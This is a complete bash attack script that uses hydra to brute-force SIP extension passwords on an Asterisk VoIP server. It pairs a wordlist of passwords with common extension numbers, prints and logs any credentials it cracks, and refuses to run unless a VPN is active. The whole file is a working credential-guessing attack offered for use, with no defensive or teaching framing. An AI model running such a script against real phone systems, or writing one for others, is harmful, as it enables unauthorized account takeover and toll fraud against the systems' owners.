#!/bin/bash

# Asterisk SIP/VoIP Attack Script
# Description: Attacks Asterisk SIP accounts (VoIP phone system)
# Usage: Edit TARGET variable and run

set -euo pipefail

# ============================================
# CONFIGURATION - EDIT ONLY THIS LINE
# ============================================
TARGET="192.168.1.100"  # <-- Change this to your Asterisk server IP

# ============================================
# DO NOT EDIT BELOW THIS LINE
# ============================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORDLIST="${PROJECT_ROOT}/config/admin_passwords.txt"
PORT=5060  # SIP default port
THREADS=8
LOG_FILE="${HOME}/hydra-logs/asterisk_sip_$(date +%Y%m%d_%H%M%S).log"

# Common SIP extensions to try
EXTENSIONS="100 101 102 103 104 105 200 201 202 300 1000 1001 2000 admin"

# Banner
echo -e "${BLUE}"
echo "╔════════════════════════════════════════╗"
echo "║   Asterisk SIP/VoIP Attack            ║"
echo "║   Target: $TARGET:$PORT"
echo "╚════════════════════════════════════════╝"
echo -e "${NC}"

# Check VPN
if [ -f "${PROJECT_ROOT}/scripts/vpn_check.sh" ]; then
    bash "${PROJECT_ROOT}/scripts/vpn_check.sh" || {
        echo -e "${YELLOW}[!] VPN not active${NC}"
        exit 1
    }
fi

# Check hydra
if ! command -v hydra &> /dev/null; then
    echo -e "${RED}[!] Hydra not found. Run: bash install.sh${NC}"
    exit 1
fi

# Check wordlist
if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}[!] Wordlist not found: $WORDLIST${NC}"
    exit 1
fi

# Create temporary extension file
TEMP_EXT=$(mktemp)
trap 'rm -f "$TEMP_EXT"' EXIT ERR

echo "$EXTENSIONS" | tr ' ' '\n' > "$TEMP_EXT"

# Create log directory
mkdir -p "$(dirname "$LOG_FILE")"

echo -e "${BLUE}[*] Starting Asterisk SIP attack...${NC}"
echo -e "${BLUE}[*] Target: $TARGET:$PORT${NC}"
echo -e "${BLUE}[*] Testing extensions: $EXTENSIONS${NC}"
echo -e "${BLUE}[*] Threads: $THREADS${NC}"

# Run hydra attack
hydra -L "$TEMP_EXT" -P "$WORDLIST" \
    -t "$THREADS" \
    -s "$PORT" \
    -f \
    -o "$LOG_FILE" \
    "$TARGET" \
    sip 2>&1 | while IFS= read -r line; do
    
    echo "$line"
    
    if echo "$line" | grep -q "login:"; then
        extension=$(echo "$line" | sed -n 's/.*login: \([^ ]*\).*/\1/p')
        password=$(echo "$line" | sed -n 's/.*password: \(.*\)/\1/p')
        
        echo -e "${GREEN}[+] SUCCESS! SIP credentials found:${NC}"
        echo -e "${GREEN}    Extension: $extension${NC}"
        echo -e "${GREEN}    Password: $password${NC}"
        echo -e "${GREEN}[+] SIP URI: sip:$extension@$TARGET${NC}"
        
        if [ -f "${PROJECT_ROOT}/scripts/logger.sh" ]; then
            source "${PROJECT_ROOT}/scripts/logger.sh"
            save_result "asterisk-sip" "$TARGET" "$PORT" "$extension" "$password"
        fi
    fi
done

echo -e "${GREEN}[+] Attack completed!${NC}"
echo -e "${BLUE}[*] Results saved to: $LOG_FILE${NC}"
